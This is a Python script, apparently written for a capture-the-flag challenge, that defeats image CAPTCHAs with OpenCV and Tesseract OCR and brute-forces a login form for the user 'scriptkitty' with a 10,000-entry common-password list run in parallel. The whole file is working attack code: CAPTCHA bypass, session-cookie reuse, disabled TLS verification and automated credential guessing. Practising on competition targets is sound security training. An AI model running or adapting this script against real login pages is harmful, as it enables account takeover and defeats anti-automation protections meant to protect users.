import concurrent.futures
import requests
from PIL import Image
import pytesseract
import io
import cv2
import numpy as np


def ocr(image) -> str | None:
    # Convert image to OpenCV format (NumPy array)
    image_cv = np.array(image)
    try:
        gray = cv2.cvtColor(image_cv, cv2.COLOR_RGB2GRAY)
    except cv2.error:
        return None

    # Apply some preprocessing to clean up the image
    # You can experiment with different methods (e.g., blurring, adaptive thresholding)
    # Convert to binary using thresholding
    _, thresh = cv2.threshold(gray, 150, 255, cv2.THRESH_BINARY_INV)

    # Optional: Apply morphological transformations to remove noise
    kernel = np.ones((2, 2), np.uint8)
    thresh = cv2.morphologyEx(thresh, cv2.MORPH_OPEN, kernel)

    # Optional: Resize the image if the characters are too small
    thresh = cv2.resize(thresh, None, fx=2, fy=2, interpolation=cv2.INTER_LINEAR)

    # Debug: Display the processed image to inspect how well it's cleaned up
    # cv2.imshow('Processed CAPTCHA', thresh)
    # cv2.waitKey(0)
    # cv2.destroyAllWindows()

    # Perform OCR on the processed image
    captcha_text = pytesseract.image_to_string(thresh, config='--psm 8')  # Using psm 8 for single word/character mode

    # Clean up the result (remove non-alphanumeric characters)
    captcha_text = ''.join(filter(str.isalnum, captcha_text))
    if len(captcha_text) != 5:  # We know these captchas are all length 5
        return None
    return captcha_text


def try_password(password: str) -> bool:
    captcha_request = requests.get('http://icc.metaproblems.com:5750/visualCaptcha/getImage.php', verify=False)
    image = Image.open(io.BytesIO(captcha_request.content))

    captcha_code = ocr(image)
    if captcha_code is None:
        return try_password(password)

    data = {
        'username': 'scriptkitty',
        'password': password,
        'captcha_code': captcha_code,
        'submit': 'submit',
    }
    session = captcha_request.cookies.get("PHPSESSID")
    cookies = {
        "PHPSESSID": session
    }

    login_request = requests.post('http://icc.metaproblems.com:5750/', cookies=cookies, data=data, verify=False)
    if "Your username or password is not correct. Please try again." in login_request.text:
        print(password, "incorrect")
        return False
    elif "Error! Invalid CAPTCHA." in login_request.text:
        return try_password(password)
    else:
        print(password)
        print(login_request.text)
        return True


def main():
    with open("10k-most-common.txt") as f:
        passwords = [line.strip() for line in f]
    passwords = passwords[::-1]

    with concurrent.futures.ProcessPoolExecutor() as executor:
        futures = {password: executor.submit(try_password, password) for password in passwords}

    for password, future in futures.items():
        if future.result():
            print(password)


if __name__ == '__main__':
    main()


# Took 375.4s to try 100 passwords
